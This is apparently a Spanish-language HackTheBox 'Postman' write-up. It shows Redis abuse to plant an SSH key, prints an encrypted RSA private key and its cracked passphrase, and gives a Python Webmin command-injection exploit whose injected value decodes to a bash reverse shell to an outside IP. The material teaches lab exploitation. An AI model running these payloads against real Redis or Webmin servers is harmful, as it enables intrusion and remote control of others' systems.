---
title: "HTB - Postman"
draft: false
tags: ["CTF", "HackTheBox", "Linux", "Webmin", "Easy"]
---

# Enumeracion

```bash
# Nmap 7.98 scan initiated Tue Mar  3 16:11:31 2026 as: /usr/lib/nmap/nmap -sS -sCV -p22,80,6379,10000 --min-rate 5000 -n -Pn -oN VersionScan 10.129.2.1
Nmap scan report for 10.129.2.1
Host is up (0.050s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  3 16:12:14 2026 -- 1 IP address (1 host up) scanned in 43.20 seconds
```

## Puerto 80 - HTTP

Abriendo la pagina en el navegador vemos algo tal que esto

![Puerto 80 - Web principal](images/Puerto80.png)

#### Directory listing

Con `gobuster` realizamos una enumeracion de directorios a ver si encontramos algo. Y encontramos algo que podria interesarnos , un directorio uploads.

![Puerto 80 - Web principal](images/Puerto80.png)

Pero por aqui no encontramos mas.

## Puerto 10000 - HTTPS

Abrimos el pueto 10000 en el navegador y encontramos un panel de login de webmin.

![Puerto 10000 - Webmin](images/webmin.png)


## Puerto 6379 - Redis

Enumerando el puerto no encontramos nada, pero podemos conseguir una shell de otra manera

```bash

config set dir ./.ssh

cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set kryonesp


10.129.2.1:6379> keys *
(empty array)
10.129.2.1:6379>config set dir ./.ssh
OK
10.129.2.1:6379>config set dir ./.ssh
1) "dir"
2) "/var/lib/redis/.ssh/"
   
10.129.2.1:6379> config set dbfilename "authorized_keys"
OK
10.129.2.1:6379> save


ssh redis@10.129.2.1 -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ 

```

Como veis podemos conseguir una shell a traves de ssh.

# Explotacion

Listando por la maquina encontramos algo curioso, en el directorio /opt encontramos una clave id_rsa de matt

![ID RSA](images/ls_id_rsa.png)
```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Aunque como vemos esta encriptada por lo que para ello tenemos que desencriptarla para ello emplearemos ssh2john y jhon para romperla

![Contraseña de MATT](images/matt_passwd.png)
Como vemos la acabamos de romper y vemos que la contraseña de la clave rsa es computer2008, como por ssh no conseguimos logearnos usamos su con la contraseña que acabamos de conseguir

```bash
su Matt
```

![User Flag](images/user_flag.png)

# Priv Esc

Probamos a logearnos en webmin con el usuario que tenemos y efectivamente funciona

![Webmin Login](images/webmin_info.png)

En el titulo de la pagina podemos encontrar una version, buscando informacion sabesmos que hay una vulnerabilidad que nos permite ejecutar codigo.
![Webmin Version](images/webmin_version.png)

Modificando un exploit que encontramos en rb, conseguiremos que se envie la peticion y enviar codigo para obtener una revshell.
```python
from pwn import *
import requests, urllib3, sys, pdb, signal, time

def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

login_url = "https://10.129.2.1:10000/session_login.cgi"
update_url= "https://10.129.2.1:10000/package-updates/update.cgi"

def make_request():

    urllib3.disable_warnings()
    s = requests.session()
    s.verify = False
    data_post = {
        "user": "Matt",
        "pass": "computer2008"
    }

    headers = {
        'Cookie': 'redirect=1; testing=1; sid=x'
        
    }

    r = s.post(login_url, data=data_post, headers=headers)

    post_data = [
    ('u', 'acl/apt'), 
    ('u', '| bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY4LzQ0MyAwPiYx | base64 -d | bash"'), 
    ('ok_top', 'Update Selected Packages')
    ]
    
    headers = {
        'Referer': 'https://10.129.2.1:10000/package-updates/?xnavigation=1'
    }

    r = s.post(update_url, data=post_data, headers=headers)
    print(r.text)

if __name__ == "__main__":
    make_request()
```

Con esto conseguimos una shell y ya podemos leer el root.txt

![Root Flag](images/root_flag.png)
